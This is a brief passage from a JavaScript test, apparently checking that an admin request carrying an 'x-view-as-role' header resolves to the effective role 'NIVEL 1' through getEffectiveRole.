      'x-view-as-role': 'NIVEL 1'
    },
    query: {}
  };
  const adminRoleResult = getEffectiveRole(reqAdmin);
  assert.equal(adminRoleResult, 'NIVEL 1'); // Permitido
});




